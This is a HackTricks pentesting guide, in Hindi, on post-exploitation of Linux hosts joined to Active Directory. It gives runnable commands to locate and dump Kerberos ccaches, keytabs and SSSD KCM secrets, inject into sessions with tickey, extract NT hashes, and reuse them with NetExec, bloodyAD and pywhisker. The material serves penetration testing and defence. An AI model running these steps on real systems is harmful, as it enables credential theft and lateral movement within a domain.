# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

एक Linux machine Active Directory environment के अंदर भी मौजूद हो सकती है।

AD के अंदर मौजूद Linux machine **Kerberos material को locally store** कर सकती है: user ccaches, machine/service keytabs और SSSD-managed secrets। इन artefacts का आमतौर पर किसी भी अन्य Kerberos credential की तरह reuse किया जा सकता है। इनमें से अधिकांश को पढ़ने के लिए आपको ticket का user owner या machine पर **root** होना आवश्यक होगा।

## Enumeration

### Linux से AD Enumeration

यदि आपके पास Linux (या Windows में bash) से AD का access है, तो आप AD की Enumeration के लिए [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) आज़मा सकते हैं।

आप Linux से **AD की Enumeration करने के अन्य तरीकों** के बारे में जानने के लिए निम्नलिखित page भी देख सकते हैं:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA Microsoft Windows **Active Directory** का एक open-source **alternative** है, जो मुख्य रूप से **Unix** environments के लिए बनाया गया है। यह management के लिए एक complete **LDAP directory** को MIT **Kerberos** Key Distribution Center के साथ combine करता है, जो Active Directory के समान है। CA और RA certificate management के लिए Dogtag **Certificate System** का उपयोग करते हुए, यह smartcards सहित **multi-factor** authentication को support करता है। SSSD Unix authentication processes के लिए integrated है। इसके बारे में अधिक जानकारी यहां प्राप्त करें:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Tickets को access करने से पहले यह पहचानें कि host को AD से **कैसे join किया गया था** और **Kerberos material वास्तव में कहां store है**। Modern Linux hosts पर इसे आमतौर पर `realmd` + `adcli` + `sssd` द्वारा handle किया जाता है, न कि केवल `/tmp` में मौजूद flat files द्वारा:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
यह जल्दी बता देता है कि host AD पर भरोसा करता है या नहीं, SSSD identities या tickets को cache कर रहा है या नहीं, और क्या **machine/service keytabs** या **KCM secrets** का दुरुपयोग करने के लिए उपलब्ध हैं।

## Tickets के साथ प्रयोग

### Pass The Ticket

इस page में आपको अलग-अलग स्थान मिलेंगे जहाँ आप **Linux host के अंदर Kerberos tickets खोज** सकते हैं। अगले page में आप सीख सकते हैं कि इन CCache ticket formats को Kirbi (Windows में उपयोग करने के लिए आवश्यक format) में कैसे बदलें और PTT attack कैसे करें:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

यदि आप **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, आदि) चाहते हैं, तो dedicated page देखें:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### `/tmp` से CCACHE ticket reuse

CCACHE files **Kerberos credentials को store करने** के लिए binary formats होती हैं। `FILE:/tmp/krb5cc_%{uid}` अभी भी आम है, लेकिन modern Linux deployments में `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, या `KCM:%{uid}` का भी उपयोग होता है। यह मानने से पहले कि tickets `/tmp` में मौजूद हैं, **`KRB5CCNAME`** environment variable और `default_ccache_name` setting को check करें।
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyring से CCACHE ticket reuse

**Process की memory में stored Kerberos tickets को extract किया जा सकता है**, खासकर जब machine की ptrace protection (`/proc/sys/kernel/yama/ptrace_scope`) disabled हो। इस उद्देश्य के लिए एक उपयोगी tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) है, जो sessions में inject करके और tickets को `/tmp` में dump करके extraction की सुविधा देता है।

इस tool को configure और use करने के लिए नीचे दिए गए steps follow किए जाते हैं:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
यह procedure विभिन्न sessions में inject करने का प्रयास करेगा और सफलता का संकेत `/tmp` में `__krb_UID.ccache` naming convention के साथ extracted tickets को store करके देगा।

### SSSD KCM से CCACHE ticket reuse

SSSD database की एक copy `/var/lib/sss/secrets/secrets.ldb` path पर maintain करता है। इससे संबंधित key `/var/lib/sss/secrets/.secrets.mkey` path पर hidden file के रूप में stored होती है। By default, यह key केवल **root** permissions होने पर readable होती है।

**`SSSDKCMExtractor`** को --database और --key parameters के साथ invoke करने पर यह database को parse करके **secrets को decrypt** करेगा।
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob को usable Kerberos CCache file में convert किया जा सकता है, जिसे Mimikatz/Rubeus को pass किया जा सकता है।**

### त्वरित keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab से accounts extract करें

Root privileges के साथ operate करने वाली services के लिए आवश्यक service account keys, **`/etc/krb5.keytab`** files में securely stored होती हैं। ये keys, services के passwords के समान, strict confidentiality की मांग करती हैं।

keytab file के contents inspect करने के लिए **`klist`** का उपयोग किया जा सकता है। Linux पर, `klist -k -K -e` principals, key version numbers, encryption types और raw key material print करता है। यदि key type **23 / RC4-HMAC** है, तो key value उस principal का **NT hash** भी होती है।
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux users के लिए, **`KeyTabExtract`** RC4 HMAC hash extract करने की functionality प्रदान करता है, जिसका उपयोग NTLM hash reuse के लिए किया जा सकता है। ध्यान दें कि यह तभी मदद करता है जब keytab में अभी भी **etype 23 / RC4-HMAC** material मौजूद हो। **AES-only** environments में आपको reusable NT hash नहीं मिल सकता, लेकिन आप Kerberos के माध्यम से keytab का उपयोग करके सीधे authenticate कर सकते हैं।
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS पर, **`bifrost`** keytab file analysis के लिए एक tool के रूप में काम करता है।
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
निकाली गई account और hash जानकारी का उपयोग करके, **`NetExec`** जैसे tools से servers के साथ connections स्थापित किए जा सकते हैं।
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` से machine account का पुनः उपयोग

`realmd`/`adcli`/`sssd` से joined systems पर, `/etc/krb5.keytab` में आमतौर पर **computer account** और एक या अधिक **host/service principals** होते हैं। यदि आपके पास **root** access है, तो इसे केवल dump न करें: `klist -k` द्वारा सूचीबद्ध किसी principal का उपयोग करके TGT request करें और स्वयं Linux host के रूप में operate करें।
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
यह विशेष रूप से तब उपयोगी होता है जब **computer object** के पास स्वयं AD में delegated rights हों या host को **gMSA** जैसे अन्य secrets retrieve करने की अनुमति हो।

### Linux-first AD tooling के साथ चोरी की गई Kerberos material का पुनः उपयोग

एक मान्य `ccache` या उपयोग योग्य keytab प्राप्त होने के बाद, आप सब कुछ पहले Windows formats में convert किए बिना **सीधे Linux से** AD पर कार्य कर सकते हैं। कई आधुनिक tools `KRB5CCNAME` / Kerberos auth को native रूप से स्वीकार करते हैं:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
यह **Linux post-exploitation** और **AD object abuse** के बीच एक अच्छा bridge है। Object-level abuse paths के लिए देखें:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

हाल के Linux deployments सीधे AD से **Managed Service Accounts** का उपयोग कर सकते हैं। व्यवहार में इसका अर्थ है कि Linux server को compromise करने के बाद आपको केवल host keytab ही नहीं, बल्कि gMSA से generated **service-specific keytabs** भी मिल सकते हैं। जाँच करने के लिए सामान्य स्थान `/etc/gmsad.conf`, deployment-specific config files और `/etc` के अंतर्गत मौजूद अतिरिक्त `*.keytab` files हैं।
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
यह आपको उस gMSA से जुड़े SPNs के लिए एक reusable Kerberos identity देता है, **बिना किसी Windows endpoint को छुए**। AD में higher privileges प्राप्त करने के बाद **domain-side** gMSA/dMSA abuse के लिए देखें:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
